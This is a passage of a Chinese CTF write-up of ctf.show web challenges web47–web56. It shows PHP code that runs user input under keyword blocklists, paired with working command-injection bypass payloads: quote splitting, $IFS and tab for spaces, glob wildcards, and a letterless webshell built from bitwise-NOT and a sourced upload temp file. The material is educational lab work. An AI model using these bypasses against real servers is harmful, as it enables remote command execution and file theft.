class="line">?c=nl%09fla\g.php||</span><br></pre></td></tr></table></figure><h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><h2 id="“双引号绕过关键词过滤"><a href="#“双引号绕过关键词过滤" class="headerlink" title="“双引号绕过关键词过滤"></a>“双引号绕过关键词过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 21:59:23</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 22:06:20</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><h2 id="linux绕过关键词过滤集合"><a href="#linux绕过关键词过滤集合" class="headerlink" title="linux绕过关键词过滤集合"></a>linux绕过关键词过滤集合</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 22:22:43</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl%09fla\g.php||</span><br><span class="line">?c=nl%09fla\g.php%0a</span><br><span class="line">?c=nl%09fla&#x27;&#x27;g.php%0a</span><br><span class="line">?c=nl%09fla&quot;&quot;g.php%0a</span><br><span class="line">?c=vi%09fla\g.php%0a</span><br><span class="line">?c=tac%09fla\g.php%0a</span><br><span class="line">?c=uniq%09fla\g.php%0a</span><br><span class="line">?c=nl&lt;fla\g.php||</span><br><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php||</span><br><span class="line">?c=nl&lt;fla&quot;&quot;g.php||</span><br><span class="line">?c=nl&lt;fla\g.php%26</span><br></pre></td></tr></table></figure><h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 22:32:47</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&quot;&quot;g.php||</span><br><span class="line">?c=nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure><h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 22:42:52</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&quot;&quot;g.php||</span><br><span class="line">?c=nl&lt;fla\g.php||</span><br><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><h2 id="linux-IFS代替空格"><a href="#linux-IFS代替空格" class="headerlink" title="linux$IFS代替空格"></a>linux$IFS代替空格</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 22:50:30</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$IFS\fla\g.php||</span><br></pre></td></tr></table></figure><h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 18:21:02</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=c&#x27;&#x27;at$&#123;IFS&#125;fla&#x27;&#x27;g.p&#x27;&#x27;hp</span><br><span class="line">?c=nl$IFS\fla\g.php</span><br></pre></td></tr></table></figure><h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><h2 id="统配执行语句-x2F-bin-x2F-c-IFS"><a href="#统配执行语句-x2F-bin-x2F-c-IFS" class="headerlink" title="???统配执行语句&#x2F;bin&#x2F;c??${IFS}????????"></a>???统配执行语句&#x2F;bin&#x2F;c??${IFS}????????</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: Lazzaro</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 19:43:42</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/bin/c??$&#123;IFS&#125;????????</span><br><span class="line">?c=/bin/c??$IFS????????</span><br></pre></td></tr></table></figure><h1 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h1><h2 id="统配base64执行语句-x2F-x2F-64"><a href="#统配base64执行语句-x2F-x2F-64" class="headerlink" title="???统配base64执行语句&#x2F;???&#x2F;????64 ????????"></a>???统配base64执行语句&#x2F;???&#x2F;????64 ????????</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: Lazzaro</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????????</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204021330313.png" alt="image-20220402133049186"></p><p>法二</p><p>看下面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403162441419.png" alt="image-20220403162441419"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403162510204.png" alt="image-20220403162510204"></p><h2 id="phithon的无字母webshell"><a href="#phithon的无字母webshell" class="headerlink" title="phithon的无字母webshell"></a>phithon的无字母webshell</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="php7下"><a href="#php7下" class="headerlink" title="php7下"></a>php7下</h3><p>我们将代码放入index.php中,然后执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:7.2-apache</span><br></pre></td></tr></table></figure><ul><li>–rm 在容器退出时就能够自动清理容器内容部的文件系统</li><li>-p 将本机的9090端口映射到容器80端口</li><li>-v 指定挂载位置 `pwd`是将当前目录挂载到&#x2F;var&#x2F;www&#x2F;html目录下 </li><li>php:7.2-apache :运行一个php:7.2-apache容器</li></ul><p>在php7之前是不允许使用($a)();这样的方法来执行动态函数的,在php7之后可以使用(‘phpinfo’)();来执行函数,第一个括号中可以任意的php表达</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p>就相当于phpinfo();这里的~代表取反的意思,而其中有不可见字符,就用url编码表示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo ~urldecode(&#x27;%8F%97%8F%96%91%99%90&#x27;);</span><br><span class="line">#phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403150504271.png" alt="image-20220403150504271"></p><h3 id="php5下"><a href="#php5下" class="headerlink" title="php5下"></a>php5下</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apache</span><br></pre></td></tr></table></figure><ul><li>shell下可以使用.来执行任意脚本</li><li>linux文件名支持用glob通配符代替</li></ul><p>. file执行文件,是不需要file有x权限的.那么,如果目标服务器上有一个我们可控的文件,那么就可以利用.来执行.我们可以发送一个上传文件的POST包,此时PHP会将我们上传的文件保存在临时文件夹下,默认的文件名是&#x2F;tmp&#x2F;phpxxxxxx,文件名的最后六个字符是随机大小写的.</p><ul><li>*可以代替0个及以上任意字符</li><li>?可以代表1个任意字符</li></ul><p>那么,&#x2F;tmp&#x2F;phpxxxxxx就可以表示为&#x2F;*&#x2F;?????????或者&#x2F;???&#x2F;???????? </p><p>但是在能够匹配上&#x2F;???&#x2F;?????????这个通配符的文件有很多</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154526590.png" alt="image-20220403154526590"></p><p>但是glob通配符还支持使用[^x]的方法来构造”这个位置不是字符x”.那么我们就可以使用这个姿势干掉&#x2F;bin&#x2F;run-parts</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/???[^-]?????</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154702204.png" alt="image-20220403154702204"></p><p>排除了第4个字符是-的文件，同样我们可以排除包含.的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/???[^-][^.][^.]?[^.]?</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154718043.png" alt="image-20220403154718043"></p><p>跟正则表达式一样,glob支持利用[0-9]来表示一个范围</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154902410.png" alt="image-20220403154902410"></p><p>这里所有的文件名都是小写,只有php生成的临时文件包含大写字母,那么我们只要找到一个表示大写字母的glob通配符就可以了.易知大写字母位于@与[之间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/?????????[@-[]</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403155124971.png" alt="image-20220403155124971"></p><p>最后传入的是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</span><br></pre></td></tr></table></figure><p>先写一个上传文件的html文件</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://831fec7f-ff8b-4fe6-869c-d2d8e70dc2c4.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403161216118.png" alt="image-20220403161216118"></p><p>至于这里为什么要添加?&gt;如果我们通过&lt;?&#x3D;`ls`去执行就需要在啊前面添加?&gt;</p><p>原因就是eval()函数相当于执行php代码,而&lt;?&#x3D;就相当于&lt;?php echo,在php7以上不管short_open_tag配置是不是开启都可以用.所以就相当于一个新的php文件,这样的话就需要将在前面的&lt;?php给闭合,不然不会执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php ?&gt;&lt;?=`ls`;</span><br></pre></td></tr></table></figure><h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: Lazzaro</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span 